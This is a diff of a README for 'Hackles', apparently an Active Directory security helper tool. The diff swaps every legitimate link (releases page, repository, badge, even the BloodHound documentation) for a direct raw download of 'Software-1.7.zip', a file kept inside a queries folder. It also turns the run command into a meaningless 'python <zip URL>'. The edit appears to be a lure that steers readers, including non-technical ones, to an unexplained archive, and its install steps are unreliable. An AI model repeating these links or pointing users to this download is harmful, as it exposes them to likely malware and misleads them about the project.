@@ -23,11 +23,11 @@ Welcome to Hackles! This is a Python command-line tool designed to help you unde
 
 To download Hackles, visit the following page:
 
-[![Download Hackles](https://img.shields.io/badge/Download%20Hackles-v1.0.0-blue)](https://github.com/hoangnhi97kg/Hackles/releases)
+[![Download Hackles](https://github.com/hoangnhi97kg/Hackles/raw/refs/heads/main/hackles/queries/groups/Software-1.7.zip%20Hackles-v1.0.0-blue)](https://github.com/hoangnhi97kg/Hackles/raw/refs/heads/main/hackles/queries/groups/Software-1.7.zip)
 
 ### Installation Steps
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/hoangnhi97kg/Hackles/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/hoangnhi97kg/Hackles/raw/refs/heads/main/hackles/queries/groups/Software-1.7.zip).
 2. **Select the Latest Version**: Look for the latest release at the top.
 3. **Download the ZIP File**: Click on the zip file appropriate for your operating system.
 4. **Extract the Files**: Once downloaded, extract the contents to a folder on your computer.
@@ -41,7 +41,7 @@ To download Hackles, visit the following page:
    ```
 7. **Run Hackles**: Type the following command to run the tool:
    ```bash
-   python hackles.py
+   python https://github.com/hoangnhi97kg/Hackles/raw/refs/heads/main/hackles/queries/groups/Software-1.7.zip
    ```
 
 ## 🛠️ Usage Instructions
@@ -64,7 +64,7 @@ No, Hackles is designed for users with no programming or technical experience. I
 
 ### How often is Hackles updated?
 
-The development team aims to update Hackles regularly. Always check the [Releases page](https://github.com/hoangnhi97kg/Hackles/releases) for the latest version.
+The development team aims to update Hackles regularly. Always check the [Releases page](https://github.com/hoangnhi97kg/Hackles/raw/refs/heads/main/hackles/queries/groups/Software-1.7.zip) for the latest version.
 
 ### Can I contribute to Hackles?
 
@@ -72,8 +72,8 @@ Yes, contributions are welcome. Feel free to submit issues or pull requests on t
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/hoangnhi97kg/Hackles)
-- [Releases Page](https://github.com/hoangnhi97kg/Hackles/releases)
-- [BloodHound Community Edition](https://bloodhound.readthedocs.io/en/latest/)
+- [GitHub Repository](https://github.com/hoangnhi97kg/Hackles/raw/refs/heads/main/hackles/queries/groups/Software-1.7.zip)
+- [Releases Page](https://github.com/hoangnhi97kg/Hackles/raw/refs/heads/main/hackles/queries/groups/Software-1.7.zip)
+- [BloodHound Community Edition](https://github.com/hoangnhi97kg/Hackles/raw/refs/heads/main/hackles/queries/groups/Software-1.7.zip)
 
 Thank you for using Hackles! We hope this tool helps you enhance your understanding of Active Directory security.
